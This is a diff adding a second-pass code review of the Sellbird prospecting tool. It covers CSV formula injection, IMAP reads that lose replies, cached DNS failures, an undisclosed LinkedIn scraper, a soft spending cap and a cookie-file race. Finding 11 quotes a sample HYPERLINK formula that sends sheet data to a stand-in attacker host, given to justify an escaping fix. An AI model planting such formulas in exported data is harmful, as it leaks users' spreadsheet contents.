@@ -181,6 +181,172 @@ Judged against that, not against a multi-tenant service.
 
 ---
 
+---
+
+# Second pass — 2026-11-24 (the rest of the repo)
+
+The first pass read the sending path, the gate, the dashboard's auth layer and the
+outbox half of `state.py`. This one covers what was left. Numbering continues, so
+"fix 12" still means one thing.
+
+**How this pass was done:** the first pass read files top to bottom. 19,400 lines was
+too much to read that way usefully, so this one swept the whole tree for specific bug
+classes first — unbounded caches, negative results cached forever, unguarded `int()` /
+`float()` on provider payloads, untrusted text reaching a prompt unfenced, request
+input reaching a path or a query, destructive reads, missing CSV escaping, and the
+`pytz` `.replace()` DST mistake found in the first pass — then read every hit in full,
+plus each module's riskiest function.
+
+## Must fix
+
+### 11. A scraped company name can run a formula on your machine
+`sellbird/export.py:121-127`
+
+- **What this is:** `sellbird export` writes prospects to `prospects.csv`, which the
+  README and `CLAUDE.md` tell users to open in a spreadsheet or load into a sequencer.
+  The columns include `company_name`, `title`, `industry`, `personalization` and both
+  name fields.
+- **Problem:** every one of those values comes from a website Sellbird scraped, and
+  they go into the CSV unescaped. A cell beginning `=`, `+`, `-` or `@` is a formula to
+  Excel, Google Sheets and LibreOffice. A company whose page sets its name to
+  `=HYPERLINK("https://evil.example/?x="&A1,"Invoice")` gets that formula evaluated
+  when the user opens the export, leaking the sheet's contents — or worse with legacy
+  DDE. The rest of this repo is careful to the point of paranoia about untrusted web
+  text (prompt fencing, `autopilot_review`, the link checks); this is the one path
+  where that text walks straight out into another program.
+- **Fix:** escape on the way out, in `to_csv`, which is the single choke point: prefix
+  any value whose first character is in `=+-@`, tab or CR with a single quote. Four
+  lines, no change for ordinary data.
+- **If we skip it:** any site in your prospect list can attack whoever opens the
+  export, and that person is the user, not the prospect.
+
+### 12. On the SMTP provider, a reply can be lost for good
+`sellbird/integrations/smtp_mail.py:151-173`
+
+- **What this is:** `_fetch_unseen` polls IMAP for `UNSEEN` messages and reads each one
+  with `conn.fetch(msg_id, "(RFC822)")`.
+- **Problem:** a plain `RFC822` fetch — as opposed to `BODY.PEEK[]` — sets the `Seen`
+  flag as a side effect, so the message is consumed by the *read* rather than by
+  handling it. The Handler is built on the opposite promise: when it cannot handle a
+  reply (`BrainUnavailable` because Claude is down, say) it deliberately does not mark
+  it processed, returns `complete=False`, and the heartbeat holds sending so the
+  message is read again next cycle. Gmail honours that with `confirm_read()` gating its
+  history marker; Microsoft re-reads a time window. `SmtpImapProvider` implements no
+  `confirm_read` at all, so the next `UNSEEN` search will never return that message.
+  The reply is gone, its stop-on-reply never runs, and the follow-up goes out to
+  someone who already answered.
+- **Fix:** fetch with `BODY.PEEK[]` so reading is not destructive, and add a
+  `confirm_read()` that sets `Seen` on the ids the last fetch returned — which is
+  exactly the contract the base class documents.
+- **If we skip it:** every Claude outage silently drops the replies that arrived during
+  it, on the provider the README recommends for anyone not on Gmail.
+
+### 13. One DNS hiccup writes a prospect off permanently
+`sellbird/integrations/email_finder.py:149-168`
+
+- **What this is:** `get_mx_host` looks up a domain's mail server and caches the answer
+  in a module-level dict.
+- **Problem:** it caches *failures* too (`_mx_cache[domain] = None`), and the cache is
+  never cleared or expired. `find_email` reads no MX as "cannot receive mail at all"
+  and returns `status="invalid"`. That is terminal: `invalid` is not in
+  `WRITABLE_EMAIL_STATUSES`, the dashboard shows the prospect as closed out, and
+  nothing ever re-verifies. So a transient resolver timeout during a long
+  `sellbird run` — one blip, one busy resolver, one flaky VPN — permanently marks every
+  prospect at that domain as having a dead address, and the verdict outlives the
+  process in the database.
+- **Fix:** don't cache the failure. Cache a successful lookup only, and return `None`
+  for a failure without remembering it — the same distinction `HunterUnavailable`
+  already makes in this file between "no pattern" and "couldn't ask". Then treat an
+  unresolvable MX as `guess` rather than `invalid`, so it is retried instead of written
+  off.
+- **If we skip it:** prospects quietly disappear from the pipeline for network reasons,
+  under a status that claims their address is bad.
+
+## Should fix
+
+### 14. The repo says it never touches LinkedIn, and ships a LinkedIn scraper
+`sellbird/integrations/linkedin.py`, reached from `sellbird/agents/scout.py:760`
+
+- **What this is:** 433 lines of Playwright automation that logs into LinkedIn with the
+  user's own email and password, runs `/search/results/people/` queries and opens
+  `/in/` profiles.
+- **Problem:** `CLAUDE.md` tells Claude, as a flat statement of fact, that "Sellbird
+  never reads ycombinator.com, the accelerators' directories, Crunchbase, PitchBook or
+  LinkedIn (their terms forbid scraping), so don't suggest scraping them instead" —
+  while the setup steps in the same file say to install a browser "for LinkedIn
+  prospecting". Both cannot be true. A user who read the reassurance would not expect
+  their LinkedIn account to be at risk of restriction, which is what automated search
+  and profile views invite. It is double-gated (`channels.linkedin.enabled`, off by
+  default, plus `LINKEDIN_EMAIL`), so nobody scrapes by accident — but it is also the
+  largest module in the repo with no test of its own, and it handles a password.
+- **Fix:** a decision, not a patch. Either delete the module and the setup step (the
+  free OSM and DataForSEO discovery paths already do the job the project recommends),
+  or keep it and correct `CLAUDE.md` to say plainly that LinkedIn prospecting exists,
+  is off by default, risks the user's account, and is theirs to enable. I would delete
+  it: it contradicts the project's stated position, it is the one place a user's
+  password is driven through a browser, and it is untested.
+- **If we skip it:** the project's own documentation misleads users about what it does
+  with their credentials.
+
+### 15. `--max-spend` is not the hard cap it says it is
+`sellbird/collectors/discover.py:1780-1791`
+
+- **What this is:** the CLI describes `--max-spend` as a "Hard cap in dollars" and the
+  module docstring promises "a budget check inside the loop".
+- **Problem:** the check is `if report.actual_cost > max_spend: break`, run *before*
+  each query, and nothing predicts what the next query will cost. A run at $0.99
+  against a $1.00 cap still issues the next query. Only the Scavio adapters read
+  `provider.remaining_budget` and stop themselves (line 1235); DataForSEO Listings,
+  SERP and Maps, Serper and TinyFish all ignore it. The overshoot is bounded by one
+  query — cents for SERP at $0.006, up to about $0.37 for a Listings query that fills a
+  page — so this is money-small and promise-large.
+- **Fix:** before each query, compare `actual_cost + provider.estimate([query])`
+  against the cap and stop if it would exceed it. The per-query estimate already exists
+  on every adapter.
+- **If we skip it:** a documented hard cap is soft, which is the kind of thing users
+  discover on the bill.
+
+### 16. Two replies with the same subject can collapse into one
+`sellbird/integrations/smtp_mail.py:199`
+
+- **What this is:** inbound messages are deduped on `provider_id`, which falls back to
+  `f"{from_email}:{subject}"` when a message carries no `Message-ID`.
+- **Problem:** two genuine replies from the same person under the same subject
+  ("Re: quick question") produce the same key, so the second is treated as already
+  processed and dropped. Most mail has a `Message-ID`, so this is rare — but when it
+  fires the lost message is a reply, and a person's second message is usually the one
+  that says yes.
+- **Fix:** include the `Date` header in the fallback key, or use the IMAP UID, which is
+  unique per mailbox.
+- **If we skip it:** a rare silent dropped reply — finding 12's failure mode, at much
+  lower odds.
+
+## Nice to have
+
+### 17. LinkedIn session cookies are briefly world-readable
+`sellbird/integrations/linkedin.py:151-158`
+
+- **What this is:** saved session cookies, which are credentials in their own right, as
+  the code's own comment says.
+- **Problem:** `write_text()` followed by `chmod(0o600)` creates the file with the
+  umask's permissions and tightens them afterwards, leaving a window in which another
+  local user can read it. `dashboard_auth._publish_token` goes to real trouble to avoid
+  exactly this (`O_EXCL | O_NOFOLLOW`, mode set at creation), so the repo already knows
+  the pattern.
+- **Fix:** `os.open(path, O_WRONLY|O_CREAT|O_EXCL, 0o600)`, as the token writer does.
+  Moot if finding 14 removes the module.
+
+### 18. A provider's malformed number can quietly understate spend
+`sellbird/collectors/discover.py:589,668`
+
+- **What this is:** `self.last_cost = float(data.get("cost") or 0.0)` on the DataForSEO
+  response.
+- **Problem:** a non-numeric `cost` raises `ValueError` inside `fetch`, which the run
+  loop catches as a generic query failure — so that query's real spend is recorded as
+  whatever `last_cost` was reset to (0.0), understating `actual_cost` and the budget
+  check built on it.
+- **Fix:** one small `_as_float(value, default)` helper, used at both sites.
+
 `Verdict:` Healthy, and unusually careful — the sending path, the pre-send gate, the
 dashboard's auth middleware and the outbox claim-then-send sequence are all written like
 code that has already been burned once, with the reason recorded in a comment. Fix 1 first
@@ -188,13 +354,40 @@ code that has already been burned once, with the reason recorded in a comment. F
 
 `Lean: -~35 lines, -1 dependency (moved to an extra, not removed) possible.`
 
-`Not checked:` I read the heartbeat loop, the whole Sender, the Handler's inbound and
-bounce paths, the pre-send gate and autopilot review in full, the dashboard auth
-middleware and the agent allowlist, the outbox half of `state.py`, and the Brain's
-subprocess isolation. I did **not** read: `scout.py` (2236 lines), `writer.py`,
-`trainer.py`, `codex.py` (1561), the collectors (`discover.py`, `people.py`,
-`profile.py`, `ats.py`), `dashboard.py`'s 3000 lines of route bodies beyond the route
-table and the auth layer, the web front-end (`sellbird/web/`), `mailboxes.py`,
-`microsoft.py`, `gmail.py`, `smtp_mail.py`, `precleared.py`, or the 120 test files beyond
-the one that failed. I did not run the app against a live mailbox, Instantly, Wasi or any
-paid discovery provider, and I did not install Playwright, so nothing browser-driven ran.
+`Verdict (second pass):` The newly-read code is the same quality as the first pass,
+with three exceptions that share a shape: the project is rigorous about untrusted text
+*inside* itself and less so where that text leaves for another program (finding 11, the
+CSV), or where a protocol has a side effect the code didn't account for (finding 12, the
+IMAP read; finding 13, the cached DNS failure). Fix 11 and 12 first: both are silent,
+and both hurt the user rather than the prospect.
+
+`Lean (both passes): -~45 lines, -1 dependency possible, and 433 lines deletable if
+finding 14 goes the way I would recommend.`
+
+`Read in full across both passes:` the heartbeat loop; the whole Sender and the
+Handler's inbound, bounce and reply paths; the pre-send gate and autopilot review; the
+dashboard's auth middleware, agent allowlist, static route and request parsing; the
+outbox and suppression halves of `state.py`; the Brain's subprocess isolation;
+`email_finder.py`; `smtp_mail.py`; `export.py`; `linkedin.py`; `discover.py`'s cost loop
+and provider contract; `scout.py`'s prompt construction and strategy gating;
+`microsoft.py` and `gmail.py`'s inbound paths; `send_window.py`'s timezone handling;
+`public_http.py`; and `phone.py` / `wasi.py`, written this session and then reviewed.
+
+`Swept but not read line by line:` `codex.py`, `profile.py`, `people.py`, `writer.py`,
+`trainer.py` (beyond its fetch paths), `precleared.py` (beyond what it sends off the
+machine), `mailboxes.py` (beyond secret handling), `signals.py`, `ats.py`,
+`deliverability.py`, `instantly.py`, `inbox_cli.py`, `analyst.py`, and `dashboard.py`'s
+individual route bodies. Each was checked against the bug-class sweep and on its own
+main risk, and these are among the best-tested modules in the repo (codex 6 test files,
+precleared 7, writer 5, gmail 4, people / profile / signals / trainer 2 each). A sweep
+does not catch a bug that needs the whole function in your head, so this is coverage,
+not proof.
+
+`Genuinely unexamined:` `quota.py` (196 lines, the only sizeable module with no test
+file of its own; it reads Claude's own OAuth token to show the usage gauges and does not
+log it) and the web front-end (`sellbird/web/*.js`, `*.css`) beyond the Outbox rendering
+changed this session.
+
+`Not run:` the app against a live mailbox, Instantly, or any paid discovery provider.
+Playwright is still not installed, so nothing browser-driven ran — including, notably,
+the LinkedIn module in finding 14.
